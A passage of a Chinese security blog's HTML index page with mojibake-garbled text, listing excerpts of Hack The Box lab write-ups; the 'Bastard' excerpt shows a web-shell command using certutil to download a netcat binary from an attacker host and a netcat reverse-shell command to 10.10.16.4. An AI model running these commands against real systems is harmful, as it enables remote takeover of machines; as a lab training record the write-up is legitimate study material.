...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;Â·&nbsp;2 min&nbsp;Â·&nbsp;240 words&nbsp;Â·&nbsp;å…»çŒªæ—¥è®°</footer><a class=entry-link aria-label="post link to 0X000 HTB windowsé¶æœºæ€»ç»“" href=https://yangzhuzai.github.io/posts/htb/0x000-htb-windows%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0x000 å‰è¨€</h2></header><div class=entry-content><p>ä¸ªäººæ‰“é¶ç»å†ï¼Œä¸è¿½æ±‚å®Œç¾ï¼Œåªæ˜¯è®°å½•ï¼Œæ—©äº›è®°å½•è¾ƒä¸ºç²—ç³™ï¼Œè§è°…ã€‚</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;Â·&nbsp;1 min&nbsp;Â·&nbsp;word&nbsp;Â·&nbsp;å…»çŒªæ—¥è®°</footer><a class=entry-link aria-label="post link to 0x000 å‰è¨€" href=https://yangzhuzai.github.io/posts/vulnhub/0x000-%E5%89%8D%E8%A8%80/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0X001 Bastard</h2></header><div class=entry-content><p>ç«¯å£æ‰«æï¼š è·å–ç«‹è¶³ç‚¹ ç‰ˆæœ¬æ˜¯7.54ï¼š
åˆ¤æ–­ä¸€ä¸‹ï¼ŒåŸºæœ¬èƒ½ç”¨çš„å°±è¿™äº›ï¼š
ç¬¬ä¸€ä¸ªé‡åˆ°éœ€è¦å¯»æ‰¾ä¸€ä¸ªç«¯ç‚¹ï¼Œæ¥è¿›è¡Œæ¸—é€æµ‹è¯•ï¼š
é€šè¿‡gobusterå‘ç°nodeï¼š
å¯¹è¯¥ç›®å½•æ¥ç€è¿›è¡Œæ‰«æï¼Œå‘ç°01ï¼š
è®¿é—®ä¸€ä¸‹ï¼š
ç‚¹å‡»ï¼š
æŠŠrestå’Œrest_endpointè¾“å…¥è¿›å»ï¼š
æ‰§è¡ŒæˆåŠŸï¼š
æ›¿æ¢ä»£ç ï¼š
æ‰§è¡Œï¼š
ä¸Šä¼ nc:
http://10.10.10.9/cxk.php?cxk=certutil -urlcache -split -f http://10.10.16.4/nc64.exe C:\Windows\Temp\b.exe
åå¼¹shell:
start C:\Windows\Temp\b.exe -e cmd.exe 10.10.16.4 9999
ç”¨ç¬¬äºŒä¸ªrbçš„è„šæœ¬ä¹Ÿæ˜¯å¯ä»¥çš„ï¼š
ææƒ ipconfig:
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;Â·&nbsp;1 min&nbsp;Â·&nbsp;40 words&nbsp;Â·&nbsp;å…»çŒªæ—¥è®°</footer><a class=entry-link aria-label="post link to 0X001 Bastard" href=https://yangzhuzai.github.io/posts/htb/0x001-bastard/></a></article><footer class=page-footer><nav class=pagination><a class=next href=https://yangzhuzai.github.io/page/2/>Next&nbsp;&nbsp;Â»</a></nav></footer></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>å…»çŒªæ—¥è®°</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>